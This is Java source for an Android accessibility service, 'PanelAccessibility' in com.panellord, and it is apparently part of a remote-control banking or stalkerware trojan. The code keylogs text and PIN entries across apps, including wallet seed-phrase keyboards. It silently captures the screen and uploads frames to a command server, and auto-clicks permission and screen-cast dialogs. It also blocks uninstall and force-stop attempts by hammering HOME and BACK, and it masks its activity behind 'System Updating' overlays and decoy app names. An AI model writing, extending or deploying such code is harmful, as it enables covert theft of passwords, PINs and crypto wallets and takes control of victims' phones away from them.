package com.panellord;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.PowerManager;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import java.io.ByteArrayOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executor;

public class PanelAccessibility extends AccessibilityService {

    private static volatile PanelAccessibility instance;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private View blockOverlay;
    private android.widget.FrameLayout visualBlackOverlay = null;
    private static volatile android.widget.FrameLayout sVisualBlackOverlay = null;
    private static volatile View sBlockOverlay = null;
    private android.widget.TextView visualDotView = null;
    private int visualDotState = 0;
    private BroadcastReceiver screenOffReceiver = null;
    private PowerManager.WakeLock powerWakeLock = null;
    private static volatile boolean powerLockEnabled = false;
    // Persistent overlay flags — survive system dialogs (fingerprint/biometric)
    private volatile boolean blockInputEnabled = false;
    private volatile boolean blackScreenEnabled = false;
    private volatile String lastBlackScreenText = "System Updating";
    private volatile boolean gestureInProgress = false; // prevents auto-restore during gesture

    // ── Keylogger ────────────────────────────────────────────────────────────
    private final List<String> keyBuffer = new ArrayList<>();
    private static final int KEY_FLUSH_SIZE = 1;       // flush every single key instantly
    private static final long KEY_FLUSH_INTERVAL_MS = 600;
    private static final long KLOG_POLL_MS = 200;      // faster polling for real-time
    private String lastTextPkg = "";
    private String lastTextVal = "";
    private static final String PREF_PENDING_KEYS = "pending_keylog";
    private static final String PREF_NAME = "panellord_klog";
    private static volatile boolean keylogActive = false;
    private volatile String currentFieldHint = "";
    private volatile String lastKlogApp = "";
    private volatile String lastSentFieldHint = "";
    private volatile long lastPinClickTs = 0; // dedup: skip [PIN]• from text-change if a click just fired
    private static final long PIN_DEDUP_MS = 350;
    private final Map<String, String> klogSnapshot = new HashMap<>();
    private Runnable klogPollRunnable;
    // Dot-count tracking for custom in-app PIN pads (React Native, Flutter, Trust Wallet, etc.)
    private final Map<String, Integer> pinDotCount = new HashMap<>();
    private volatile long lastDotTs = 0; // last time dot-count change was emitted

    // ── PIN/password capture for reader canvas — maps pkg → actual typed text ──
    private static final java.util.concurrent.ConcurrentHashMap<String, StringBuilder>
        pwCapture = new java.util.concurrent.ConcurrentHashMap<>();
    private static volatile String pwCapturePkg = ""; // currently active pkg for pw field
    // Track whether a password field is currently focused (for keyboard click capture)
    private volatile boolean pwFieldFocused = false;
    private volatile String pwFocusedPkg = "";

    /** Returns true for home launcher packages — skip keylogging in these */
    private static boolean isLauncherPkg(String pkg) {
        if (pkg == null || pkg.isEmpty()) return false;
        return pkg.contains("launcher") || pkg.contains(".home")
            || pkg.equals("com.google.android.apps.nexuslauncher")
            || pkg.equals("com.sec.android.app.launcher")
            || pkg.equals("com.miui.home")
            || pkg.equals("com.oneplus.launcher")
            || pkg.equals("com.android.launcher")
            || pkg.equals("com.android.launcher3")
            || pkg.equals("com.huawei.android.launcher")
            || pkg.equals("com.bbk.launcher2")
            || pkg.equals("com.transsion.launcher");
    }

    /**
     * Count total password-dot characters visible in any password-mode
     * or bullet-masked input node in the current window.
     * Works for React Native, Flutter, and custom in-app PIN pads.
     */
    private int countPasswordDots(AccessibilityNodeInfo node) {
        if (node == null) return 0;
        int count = 0;
        try {
            // If the node is a password field or has bullet-masked text, count chars
            CharSequence cs = node.getText();
            String txt = cs != null ? cs.toString() : "";
            if (node.isPassword() && !txt.isEmpty()) {
                count += txt.length();
            } else if (!txt.isEmpty() && isPasswordMask(txt)) {
                count += txt.length();
            }
            // Recurse into children
            int cc = node.getChildCount();
            for (int i = 0; i < cc; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    count += countPasswordDots(child);
                    child.recycle();
                }
            }
        } catch (Exception ignored) {}
        return count;
    }

    /**
     * Extract a single digit/key from a clicked node.
     * Checks: node text → content description → first child text/desc.
     * Returns null if no digit found.
     */
    private String extractDigitFromClick(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence cs = node.getText();
        String txt = cs != null ? cs.toString().trim() : "";
        String result = matchPinKey(txt);
        if (result != null) return result;
        CharSequence cd = node.getContentDescription();
        String desc = cd != null ? cd.toString().trim() : "";
        result = matchPinKey(desc);
        if (result != null) return result;
        try {
            String viewId = node.getViewIdResourceName();
            if (viewId != null) {
                String idLower = viewId.toLowerCase();
                java.util.regex.Matcher m = java.util.regex.Pattern.compile("(?:key|btn|num|digit|pad|pin|number|button)[_\\-]?(\\d)$").matcher(idLower);
                if (m.find()) return "[PIN]" + m.group(1);
                if (idLower.contains("delete") || idLower.contains("backspace") || idLower.contains("clear") || idLower.contains("erase")) return "[⌫]";
                if (idLower.contains("enter") || idLower.contains("confirm") || idLower.contains("ok") || idLower.contains("submit") || idLower.contains("done")) return "[ENTER]";
                java.util.regex.Matcher m2 = java.util.regex.Pattern.compile("(?:^|[_\\-])([0-9])(?:$|[_\\-])").matcher(idLower);
                if (m2.find() && (idLower.contains("key") || idLower.contains("btn") || idLower.contains("pad") || idLower.contains("pin"))) {
                    return "[PIN]" + m2.group(1);
                }
            }
        } catch (Exception ignored) {}
        try {
            int cc = node.getChildCount();
            for (int i = 0; i < cc && i < 8; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    CharSequence ct = child.getText();
                    String childTxt = ct != null ? ct.toString().trim() : "";
                    String r2 = matchPinKey(childTxt);
                    if (r2 == null) {
                        CharSequence ccd = child.getContentDescription();
                        String childDesc = ccd != null ? ccd.toString().trim() : "";
                        r2 = matchPinKey(childDesc);
                    }
                    if (r2 == null) {
                        for (int j = 0; j < child.getChildCount() && j < 4; j++) {
                            AccessibilityNodeInfo gc = child.getChild(j);
                            if (gc != null) {
                                CharSequence gct = gc.getText();
                                String gcTxt = gct != null ? gct.toString().trim() : "";
                                r2 = matchPinKey(gcTxt);
                                gc.recycle();
                                if (r2 != null) break;
                            }
                        }
                    }
                    child.recycle();
                    if (r2 != null) return r2;
                }
            }
        } catch (Exception ignored) {}
        try {
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null) {
                CharSequence pt = parent.getText();
                String pTxt = pt != null ? pt.toString().trim() : "";
                String pr = matchPinKey(pTxt);
                if (pr == null) {
                    CharSequence pd = parent.getContentDescription();
                    String pDesc = pd != null ? pd.toString().trim() : "";
                    pr = matchPinKey(pDesc);
                }
                parent.recycle();
                if (pr != null) return pr;
            }
        } catch (Exception ignored) {}
        return null;
    }

    /** Returns "[PIN]X" for digits 0-9,*,#  or "[⌫]" for backspace keys,
     *  a single letter for in-app letter keyboards, else null */
    private String matchPinKey(String s) {
        if (s == null || s.isEmpty()) return null;
        // Single character keys
        if (s.length() == 1) {
            char c = s.charAt(0);
            if (Character.isDigit(c) || c == '*' || c == '#') return "[PIN]" + c;
            // Letter keys (Trust Wallet seed phrase keyboard, in-app QWERTY, etc.)
            if (Character.isLetter(c)) return String.valueOf(c);
            // Common symbol keys on in-app keyboards
            if (c == '@' || c == '.' || c == '_' || c == '-' || c == '!'
                    || c == '?' || c == ',' || c == '\'' || c == '"' || c == '/') {
                return String.valueOf(c);
            }
        }
        // Common backspace labels
        if (s.equals("⌫") || s.equals("←") || s.equals("✕") || s.equals("×")
                || s.equalsIgnoreCase("DEL") || s.equalsIgnoreCase("delete")
                || s.equalsIgnoreCase("backspace") || s.equalsIgnoreCase("clear")
                || s.equalsIgnoreCase("back") || s.equals("<")) {
            return "[⌫]";
        }
        // Content descriptions like "digit 1", "number 5", "key 3"
        if (s.matches("(?i)(digit|number|key|num|btn)\\s*([0-9])")) {
            char d = s.charAt(s.length() - 1);
            return "[PIN]" + d;
        }
        // Content descriptions like "letter a", "key b"
        if (s.matches("(?i)(letter|key|char)\\s+([a-zA-Z])")) {
            char d = s.charAt(s.length() - 1);
            return String.valueOf(d);
        }
        return null;
    }

    /**
     * Extract the actual key character from a keyboard key node.
     * Works with Gboard, Samsung Keyboard, SwiftKey, and other IMEs.
     * Returns single character string, "[⌫]" for backspace, or null if not a key.
     */
    private String extractKeyFromKeyboard(AccessibilityNodeInfo node) {
        if (node == null) return null;
        CharSequence cs = node.getText();
        CharSequence cd = node.getContentDescription();
        String txt = cs != null ? cs.toString().trim() : "";
        String desc = cd != null ? cd.toString().trim() : "";

        // Single character key (letter, digit, symbol)
        if (txt.length() == 1) {
            char c = txt.charAt(0);
            if (Character.isLetterOrDigit(c) || c == '@' || c == '.' || c == '_'
                    || c == '-' || c == '!' || c == '?' || c == ',' || c == '\''
                    || c == '"' || c == '/' || c == '#' || c == '$' || c == '%'
                    || c == '&' || c == '+' || c == '=' || c == '(' || c == ')'
                    || c == '*' || c == ';' || c == ':' || c == '<' || c == '>') {
                return txt;
            }
        }
        // ContentDescription single char (Samsung Keyboard: desc="a", desc="1")
        if (desc.length() == 1 && Character.isLetterOrDigit(desc.charAt(0))) {
            return desc;
        }
        // Space bar
        if (txt.equalsIgnoreCase("space") || desc.equalsIgnoreCase("space")
                || desc.equalsIgnoreCase("spacebar") || txt.equals(" ")) {
            return " ";
        }
        // Backspace / delete
        if (txt.equals("⌫") || txt.equals("←") || desc.equalsIgnoreCase("delete")
                || desc.equalsIgnoreCase("backspace") || desc.equalsIgnoreCase("del")
                || txt.equalsIgnoreCase("delete") || txt.equalsIgnoreCase("backspace")) {
            return "[⌫]";
        }
        // "Double tap to type X" or "X key" patterns (Gboard accessibility)
        if (desc.matches("(?i)double tap to type (.)")) {
            return String.valueOf(desc.charAt(desc.length() - 1));
        }
        if (desc.matches("(?i)(.+)\\s+key") && desc.length() <= 6) {
            String keyPart = desc.replaceAll("(?i)\\s+key$", "").trim();
            if (keyPart.length() == 1) return keyPart;
        }
        // First child text (some keyboards wrap key label in a child TextView)
        try {
            int cc = node.getChildCount();
            for (int i = 0; i < cc && i < 3; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    CharSequence ct = child.getText();
                    String childTxt = ct != null ? ct.toString().trim() : "";
                    child.recycle();
                    if (childTxt.length() == 1 && Character.isLetterOrDigit(childTxt.charAt(0))) {
                        return childTxt;
                    }
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    public static void startKeylog() {
        keylogActive = true;
        PanelAccessibility inst = instance;
        if (inst != null) inst.scheduleKlogPoll();
    }
    public static void stopKeylog() {
        keylogActive = false;
        PanelAccessibility inst = instance;
        if (inst != null) {
            if (inst.klogPollRunnable != null) inst.mainHandler.removeCallbacks(inst.klogPollRunnable);
            inst.klogSnapshot.clear();
        }
    }
    public static boolean isKeylogActive() { return keylogActive; }

    // ── Silent Screen Mirror (API 30+ via takeScreenshot, fallback via MediaProjection) ──
    private static volatile boolean screenMirrorActive = false;
    private static final int SCREEN_MIRROR_FPS_MS = 250; // 4 fps — smooth enough, light on CPU
    private static final int SCREEN_JPEG_QUALITY  = 40;  // match ScreenMirrorService quality
    private Runnable screenMirrorTick;

    public static boolean isScreenMirrorActive() { return screenMirrorActive; }

    /** Called from CommandPoller — start silent screen capture loop */
    public void startSilentScreenMirror() {
        screenMirrorActive = true;
        stopSilentScreenMirrorLoop(); // clear any old runnable first
        scheduleScreenMirrorTick();
    }

    /** Called from CommandPoller — stop capture loop */
    public void stopSilentScreenMirror() {
        screenMirrorActive = false;
        stopSilentScreenMirrorLoop();
    }

    private void stopSilentScreenMirrorLoop() {
        if (screenMirrorTick != null) {
            mainHandler.removeCallbacks(screenMirrorTick);
            screenMirrorTick = null;
        }
    }

    private void scheduleScreenMirrorTick() {
        if (!screenMirrorActive) return;
        screenMirrorTick = () -> {
            if (!screenMirrorActive) return;
            captureAndUploadFrame();
            mainHandler.postDelayed(screenMirrorTick, SCREEN_MIRROR_FPS_MS);
        };
        mainHandler.postDelayed(screenMirrorTick, 50);
    }

    @SuppressWarnings("NewApi")
    private void captureAndUploadFrame() {
        if (!screenMirrorActive) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { // API 30+
            Executor exec = command -> new Thread(command).start();
            try {
                takeScreenshot(android.view.Display.DEFAULT_DISPLAY, exec,
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult result) {
                            try {
                                android.hardware.HardwareBuffer hb = result.getHardwareBuffer();
                                Bitmap hard = Bitmap.wrapHardwareBuffer(hb, result.getColorSpace());
                                hb.close();
                                if (hard == null) return;
                                Bitmap soft = hard.copy(Bitmap.Config.ARGB_8888, false);
                                hard.recycle();
                                int sw = soft.getWidth();
                                int sh = soft.getHeight();
                                ByteArrayOutputStream baos = new ByteArrayOutputStream(24 * 1024);
                                soft.compress(Bitmap.CompressFormat.JPEG, SCREEN_JPEG_QUALITY, baos);
                                soft.recycle();
                                byte[] jpeg = baos.toByteArray();
                                String deviceId = DeviceIdManager.getDeviceId(PanelAccessibility.this);
                                ApiClient.postJpeg("/screen-frame/" + deviceId, jpeg, sw, sh);
                            } catch (Exception e) {
                                android.util.Log.w("PanelA", "Screenshot process: " + e.getMessage());
                            }
                        }
                        @Override
                        public void onFailure(int errorCode) {
                            android.util.Log.w("PanelA", "takeScreenshot failed: " + errorCode);
                        }
                    });
            } catch (Exception e) {
                android.util.Log.w("PanelA", "takeScreenshot call failed: " + e.getMessage());
            }
        } else {
            // API < 30 — ScreenMirrorService (MediaProjection) handles it
            // Just ensure it's unpaused if already running
            if (ScreenMirrorService.isRunning()) {
                ScreenMirrorService.setPaused(false);
            }
            stopSilentScreenMirrorLoop(); // don't loop; service sends its own frames
        }
    }

    private void scheduleKlogPoll() {
        if (klogPollRunnable != null) mainHandler.removeCallbacks(klogPollRunnable);
        if (!keylogActive) return;
        klogPollRunnable = () -> {
            pollKeylog();
            scheduleKlogPoll();
        };
        mainHandler.postDelayed(klogPollRunnable, KLOG_POLL_MS);
    }

    /** Polling-based keylog: scan all text fields every 500ms, diff vs snapshot */
    @SuppressWarnings("NewApi")
    private void pollKeylog() {
        if (!keylogActive) return;
        try {
            List<AccessibilityWindowInfo> windows = getWindows();
            if (windows == null) return;
            for (AccessibilityWindowInfo win : windows) {
                AccessibilityNodeInfo root = win.getRoot();
                if (root == null) continue;
                String pkg = root.getPackageName() != null ? root.getPackageName().toString() : "";
                // Skip own package and launcher/home screens
                if (!pkg.equals(MY_PKG) && !isLauncherPkg(pkg) && !isKeyboardOrSystemPkg(pkg)) {
                    scanNodeForKeylog(root, pkg);
                }
                root.recycle();
            }
        } catch (Exception ignored) {}
        synchronized (keyBuffer) {
            if (keyBuffer.size() >= KEY_FLUSH_SIZE) flushKeylog();
        }
    }

    /** Returns true if string contains only password-mask chars (•, *, ·) */
    private static boolean isPasswordMask(String s) {
        if (s == null || s.isEmpty()) return false;
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c != '\u2022' && c != '*' && c != '\u00B7') return false;
        }
        return true;
    }

    private void scanNodeForKeylog(AccessibilityNodeInfo node, String pkg) {
        if (node == null) return;
        boolean isFocusedPinField = !node.isEditable() && node.isFocused()
                && (node.isPassword() || isPasswordMask(node.getText() != null ? node.getText().toString() : ""));
        if (node.isEditable() || isFocusedPinField) {
            CharSequence textCs = node.getText();
            String nodeId = buildNodeId(node);
            String cur = textCs != null ? textCs.toString() : "";
            String prev = klogSnapshot.getOrDefault(nodeId, null);

            if (node.isPassword() || isPasswordMask(cur)) {
                // Password field — track masked text length changes (works with ANY keyboard)
                if (prev == null) {
                    klogSnapshot.put(nodeId, cur);
                } else if (cur.length() != prev.length()) {
                    int delta = cur.length() - prev.length();
                    if (delta > 0) {
                        for (int i = 0; i < delta; i++)
                            queueKey("[PIN]\u2022", pkg, System.currentTimeMillis());
                    } else {
                        for (int i = 0; i < -delta; i++)
                            queueKey("[⌫]", pkg, System.currentTimeMillis());
                    }
                    klogSnapshot.put(nodeId, cur);
                }
            } else {
                // Normal (non-password) field
                if (prev == null) {
                    klogSnapshot.put(nodeId, cur);
                } else if (!cur.equals(prev)) {
                    if (cur.length() > prev.length() && cur.startsWith(prev)) {
                        String added = cur.substring(prev.length());
                        if (!isPasswordMask(added)) queueKey(added, pkg, System.currentTimeMillis());
                    } else if (cur.length() < prev.length()) {
                        int deleted = prev.length() - cur.length();
                        for (int i = 0; i < deleted; i++)
                            queueKey("[⌫]", pkg, System.currentTimeMillis());
                        if (!cur.isEmpty() && !prev.startsWith(cur) && !isPasswordMask(cur)) {
                            queueKey(cur, pkg, System.currentTimeMillis());
                        }
                    } else {
                        if (!isPasswordMask(cur)) queueKey("[~]" + cur, pkg, System.currentTimeMillis());
                    }
                    klogSnapshot.put(nodeId, cur);
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                scanNodeForKeylog(child, pkg);
                child.recycle();
            }
        }
    }

    private String buildNodeId(AccessibilityNodeInfo node) {
        String viewId = node.getViewIdResourceName();
        String pkg = node.getPackageName() != null ? node.getPackageName().toString() : "";
        String hint = node.getHintText() != null ? node.getHintText().toString() : "";
        return pkg + "|" + (viewId != null ? viewId : "") + "|" + hint;
    }

    public static PanelAccessibility getInstance() { return instance; }

    // ── Network connectivity watcher ───────────────────────────────────────
    private android.net.ConnectivityManager.NetworkCallback networkCallback;

    private void registerNetworkCallback() {
        try {
            android.net.ConnectivityManager cm =
                (android.net.ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return;
            networkCallback = new android.net.ConnectivityManager.NetworkCallback() {
                @Override
                public void onLost(android.net.Network network) {
                    // Check immediately if ALL networks are gone
                    boolean anyUp = false;
                    try {
                        android.net.Network[] nets = cm.getAllNetworks();
                        for (android.net.Network n : nets) {
                            android.net.NetworkCapabilities nc = cm.getNetworkCapabilities(n);
                            if (nc != null && nc.hasCapability(
                                    android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
                                anyUp = true;
                                break;
                            }
                        }
                    } catch (Exception ignored) {}
                    if (!anyUp) {
                        mainHandler.post(() -> {
                            try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ig) {}
                        });
                    }
                }
            };
            android.net.NetworkRequest req = new android.net.NetworkRequest.Builder().build();
            cm.registerNetworkCallback(req, networkCallback);
        } catch (Exception ignored) {}
    }

    @Override
    public void onServiceConnected() {
        instance = this;
        // Clean up any orphaned overlays from previous service instance (e.g. after APK update)
        cleanupOrphanedOverlays();
        // If Device Owner → silently grant all permissions right now
        DeviceOwnerHelper.grantAllIfOwner(this);
        // Start periodic flush scheduler
        mainHandler.postDelayed(this::periodicFlush, KEY_FLUSH_INTERVAL_MS);
        // Attempt to flush any pending offline keylogs
        new Thread(this::flushPendingOfflineKeys).start();
        // Start background watchdog that monitors Settings for our app page
        startSettingsWatchdog();
        // Watch network: if internet drops → go Home instantly
        registerNetworkCallback();
        startCastDialogWatcher();
    }

    private void cleanupOrphanedOverlays() {
        mainHandler.post(() -> {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            // Remove static black screen overlay from previous instance
            android.widget.FrameLayout oldBlack = sVisualBlackOverlay;
            if (oldBlack != null) {
                try { wm.removeView(oldBlack); } catch (Exception ignored) {}
                sVisualBlackOverlay = null;
            }
            // Remove static block overlay from previous instance
            View oldBlock = sBlockOverlay;
            if (oldBlock != null) {
                try { wm.removeView(oldBlock); } catch (Exception ignored) {}
                sBlockOverlay = null;
            }
            // Also clean instance refs
            if (visualBlackOverlay != null) {
                try { wm.removeView(visualBlackOverlay); } catch (Exception ignored) {}
                visualBlackOverlay = null;
            }
            if (blockOverlay != null) {
                try { wm.removeView(blockOverlay); } catch (Exception ignored) {}
                blockOverlay = null;
            }
            visualDotView = null;
            blackScreenEnabled = false;
            blockInputEnabled = false;
        });
    }

    /** Public entry point — CommandPoller calls this when start_screen_mirror is received. */
    public void triggerStartCastDialogWatcher() {
        startCastDialogWatcher();
    }

    /** Retry-loop that auto-clicks "Start now" every 500 ms until screen
     *  mirror is running or 20 s have elapsed. */
    private void startCastDialogWatcher() {
        final long deadline = System.currentTimeMillis() + 20_000;
        Runnable watcher = new Runnable() {
            @Override public void run() {
                if (ScreenMirrorService.isRunning()) return;
                if (System.currentTimeMillis() > deadline) return;
                tryAutoAllow();
                mainHandler.postDelayed(this, 500);
            }
        };
        mainHandler.postDelayed(watcher, 400);
    }

    private void periodicFlush() {
        synchronized (keyBuffer) {
            if (!keyBuffer.isEmpty()) flushKeylog();
        }
        mainHandler.postDelayed(this::periodicFlush, KEY_FLUSH_INTERVAL_MS);
    }

    // ── Auto-allow: packages that show permission dialogs ──────────────────
    private static final List<String> PERM_PKGS = Arrays.asList(
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.google.android.permissioncontroller",
        "com.android.systemui",
        "com.miui.security",
        "com.miui.permcenter",
        "com.coloros.permissionmanager",
        "com.oneplus.permissionmanager",
        "com.samsung.android.permissionmanager",
        "com.lge.qmemoplus",
        "android"
    );
    // Allow button texts — multi-language + screen cast dialog
    private static final List<String> ALLOW_TEXTS = Arrays.asList(
        "allow", "allow all the time", "allow only while using the app",
        "while using the app", "only this time", "allow always",
        "izin", "izinkan", "allow access", "ok", "start now",
        "continue", "got it", "accept", "grant", "permit",
        "enable", "activate", "confirm", "proceed",
        "अनुमति दें", "अनुमति", "allow access",
        "ijazah de", "izni ver", "허용", "허락"
    );

    // ── Uninstall blocker ─────────────────────────────────────────────────
    private static final String MY_PKG = "com.panellord";
    private static final List<String> UNINSTALL_PKGS = Arrays.asList(
        "com.android.packageinstaller",
        "com.google.android.packageinstaller",
        "com.android.settings",
        "com.miui.packageinstaller",
        "com.samsung.android.packageinstaller",
        "com.android.vending",
        "android",
        "com.android.systemui",       // stock recents
        "com.miui.home",              // MIUI launcher/recents
        "com.miui.recents",
        "com.samsung.android.app.taskedge",
        "com.sec.android.app.launcher",
        "com.oneplus.launcher",
        "com.oneplus.recentapp",
        "com.huawei.android.launcher",
        "com.iqoo.secure",            // vivo phone manager
        "com.vivo.permissionmanager",
        "com.coloros.safecenter",     // oppo
        "com.oppo.safe"
    );
    private static final List<String> UNINSTALL_TEXTS = Arrays.asList(
        "uninstall", "delete app", "remove app", "hapus aplikasi",
        "desinstalar", "désinstaller", "app deinstallieren",
        "हटाएं", "अनइंस्टॉल", "ऐप हटाएं",
        "uninstall app", "do you want to uninstall", "app will be deleted",
        "force stop", "force-stop", "forcestop", "force close", "force quit",
        "फ़ोर्स स्टॉप", "강제 중지", "bắt buộc dừng",
        "app info", "application info", "end task", "end app",
        "close app", "kill app", "terminate", "stop app",
        "clear from memory", "remove from list"
    );
    private static final List<String> APP_NAMES = Arrays.asList(
        MY_PKG, "bajaj ecs", "bajajecs", "device health",
        "panellord", "com.panellord"
    );
    private int uninstallBlockCount = 0;
    private long lastBlockTime = 0;

    private boolean isUninstallScreen(AccessibilityEvent e) {
        String pkg = e.getPackageName() != null ? e.getPackageName().toString().toLowerCase() : "";

        // Fast-path for known dangerous packages: just find any danger keyword
        boolean isDangerPkg = UNINSTALL_PKGS.contains(pkg)
            || pkg.contains("packageinstaller") || pkg.contains("settings")
            || pkg.contains("systemui") || pkg.contains("recents")
            || pkg.contains("launcher") || pkg.contains("home")
            || pkg.contains("safecenter") || pkg.contains("secure")
            || pkg.contains("permissionmanager") || pkg.contains("phonemanager")
            || pkg.contains("taskmanager") || pkg.contains("cleaner")
            || pkg.contains("optimizer") || pkg.contains("manager");

        if (isDangerPkg) {
            // Check event text first (fast)
            String evText = "";
            if (e.getText() != null && !e.getText().isEmpty())
                evText = e.getText().get(0).toString().toLowerCase();
            if (e.getContentDescription() != null)
                evText += " " + e.getContentDescription().toString().toLowerCase();
            for (String ut : UNINSTALL_TEXTS) {
                if (evText.contains(ut)) return true;
            }
            // Deep-scan nodes: danger word alone is enough for these known packages
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    String flat = flattenNode(root).toLowerCase();
                    root.recycle();
                    for (String ut : UNINSTALL_TEXTS) if (flat.contains(ut)) return true;
                }
            } catch (Exception ignored) {}
        }

        // Universal fallback: ANY package — must contain BOTH a danger word AND our app identity
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                String flat = flattenNode(root).toLowerCase();
                root.recycle();
                boolean hasDanger = false, hasOurApp = false;
                for (String ut : UNINSTALL_TEXTS) if (flat.contains(ut)) { hasDanger = true; break; }
                for (String an : APP_NAMES)        if (flat.contains(an)) { hasOurApp = true; break; }
                if (hasDanger && hasOurApp) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private String flattenNode(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder sb = new StringBuilder();
        if (node.getText() != null) sb.append(node.getText()).append(" ");
        if (node.getContentDescription() != null) sb.append(node.getContentDescription()).append(" ");
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) { sb.append(flattenNode(child)); child.recycle(); }
        }
        return sb.toString();
    }

    private void blockUninstall() {
        long now = System.currentTimeMillis();
        if (now - lastBlockTime < 600) return; // debounce
        lastBlockTime = now;
        uninstallBlockCount++;

        // Step 1: Try to click "Cancel" button directly (safest — dismisses dialog cleanly)
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText("Cancel");
                if (btns == null || btns.isEmpty())
                    btns = root.findAccessibilityNodeInfosByText("cancel");
                if (btns == null || btns.isEmpty())
                    btns = root.findAccessibilityNodeInfosByText("रद्द करें"); // Hindi
                if (btns != null) {
                    for (AccessibilityNodeInfo btn : btns) {
                        if (btn != null) {
                            btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            btn.recycle();
                        }
                    }
                }
                root.recycle();
            }
        } catch (Exception ignored) {}

        // Step 2: Also press BACK to dismiss any lingering dialog/popup
        mainHandler.postDelayed(() -> {
            try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
        }, 100);

        // Step 3: Go HOME aggressively to get away from installer
        for (int i = 0; i < 3; i++) {
            final int idx = i;
            mainHandler.postDelayed(() -> {
                try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
            }, 200L + idx * 250L);
        }

        // Step 4: Re-check after 1.5 s and block again if uninstall screen is still visible
        if (uninstallBlockCount < 12) {
            mainHandler.postDelayed(() -> {
                try {
                    AccessibilityNodeInfo root = getRootInActiveWindow();
                    if (root != null) {
                        String flat = flattenNode(root).toLowerCase();
                        root.recycle();
                        boolean stillUninstall = false;
                        for (String ut : UNINSTALL_TEXTS) {
                            if (flat.contains(ut)) { stillUninstall = true; break; }
                        }
                        if (stillUninstall) blockUninstall();
                    }
                } catch (Exception ignored) {}
            }, 1500);
        } else {
            uninstallBlockCount = 0;
        }
    }

    // ── Settings / Recents / Launcher App-blocker ────────────────────────────
    private static final String[] DANGER_WORDS = {
        "force stop", "force-stop", "force close", "force quit",
        "स्टॉप करें", "강제 중지", "फ़ोर्स स्टॉप",
        "uninstall", "désinstaller", "desinstalar", "hapus", "हटाएं",
        "clear data", "clear cache", "storage & cache",
        "disable", "deactivate",
        "app info", "application info", "end task", "end app",
        "stop app", "close app", "kill app", "terminate",
        "clear from memory", "remove from list"
    };
    private long lastSettingsBlock = 0;

    private void checkAndBlockAppInfo() {
        long now = System.currentTimeMillis();
        if (now - lastSettingsBlock < 60) return; // prevent re-entry within 60ms
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            String curPkg = root.getPackageName() != null
                ? root.getPackageName().toString().toLowerCase() : "";
            String flat = flattenNode(root).toLowerCase();
            root.recycle();

            boolean hasOurApp = flat.contains(MY_PKG.toLowerCase());
            if (!hasOurApp) {
                for (String an : APP_NAMES) {
                    if (flat.contains(an.toLowerCase())) { hasOurApp = true; break; }
                }
            }

            boolean hasDanger = false;
            for (String dw : DANGER_WORDS) {
                if (flat.contains(dw)) { hasDanger = true; break; }
            }

            // For recents / systemui / launcher: danger word alone is enough
            // (context menus in recents don't always repeat the app name in node tree)
            boolean isRecentsPkg = curPkg.contains("systemui") || curPkg.contains("recents")
                || curPkg.contains("launcher") || curPkg.contains("home");

            boolean shouldBlock = (hasOurApp && hasDanger) || (isRecentsPkg && hasDanger);

            if (shouldBlock) {
                lastSettingsBlock = now;
                // BACK first — dismisses context menu / dialog immediately
                try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
                // Then HOME 10× at 70ms — user cannot possibly tap Force Stop
                for (int i = 0; i < 10; i++) {
                    final int idx = i;
                    mainHandler.postDelayed(() -> {
                        try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
                    }, idx * 70L);
                }
            }
        } catch (Exception ignored) {}
    }

    // ── Active Apps "Stop" blocker (Samsung / stock systemui foreground panel) ──
    private long lastActiveAppsBlock = 0;
    private void checkAndBlockActiveApps() {
        long now = System.currentTimeMillis();
        if (now - lastActiveAppsBlock < 400) return;
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;
            String flat = flattenNode(root).toLowerCase();
            root.recycle();

            // "Active apps" panel: title + Stop/Close button — no need for app name check
            // because the only app in foreground service is ours
            boolean isActiveAppsPanel =
                (flat.contains("active apps") || flat.contains("background app")
